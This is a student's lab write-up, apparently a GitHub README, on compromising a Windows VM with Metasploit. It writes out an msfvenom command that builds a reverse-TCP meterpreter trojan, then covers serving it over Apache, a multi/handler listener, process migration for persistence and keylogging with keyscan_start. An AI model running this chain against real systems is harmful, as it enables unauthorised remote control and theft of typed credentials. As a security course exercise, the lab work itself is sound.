# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit
## Name: Yathin Reddy T
## Reg No: 212223100062
# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

## ifconfig
192.168.91.247

![ipconfig6(1)](https://github.com/user-attachments/assets/5f670a52-63d9-415c-ab0a-bfa942cd94d0)
Find the attackers ip address using ifconfig

## msfvenom

![msfvenom(1)new](https://github.com/user-attachments/assets/8dd59155-f5e6-473f-8840-292ee5b0e07b)

Create a malicious executable file fun.exe using msfvenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

##  copy the fun.exe into apache/var/www/html/
![systemctl(1)](https://github.com/user-attachments/assets/69eb6758-41e8-4294-b2cb-d9dcd2416175)

copy fun.exe start apache server sudosystemctl apache2 start check the status of apache2

## msfconsole

![msfconsolehelp](https://github.com/user-attachments/assets/23643dfe-ca81-488d-a833-c6450a55610f)

invoke msfconsole Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

## Multihander,setpayload,exploit

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Parrot machine: http://192.168.91.247/

![new1](https://github.com/user-attachments/assets/0bd712a9-76cb-41d6-aceb-1152a6c04d4f)

![catarul](https://github.com/user-attachments/assets/656b11b1-d958-45f9-a4e1-e863e6102036)

![VirtualBox_windows 7_21_04_2025_13_34_08(2)](https://github.com/user-attachments/assets/5d96f50e-0cfa-4127-ba3f-3dd81910f545)

![folderforfunexe](https://github.com/user-attachments/assets/83b175cf-c502-46bc-99a2-06d4854063f1)

![usemulti](https://github.com/user-attachments/assets/bc802e2b-836e-477f-8356-eceb82bb8eef)

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

![ps](https://github.com/user-attachments/assets/42b39d96-52d9-4e5c-bd7a-d23534ee8ee5)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
![netstat](https://github.com/user-attachments/assets/8a6d9037-074c-4527-9c8c-65b5606abdcb)

## Post Exploitation

The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![keyscan_startanddump](https://github.com/user-attachments/assets/87f5f7b1-8f78-4bb2-ac9f-c88ffcde3f0b)

![output](https://github.com/user-attachments/assets/5cfcb9d5-80bc-4425-8477-f3d2ffc73965)

![keyscan_startanddump](https://github.com/user-attachments/assets/7beac93c-96ea-47f3-a842-e350d57bba12)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
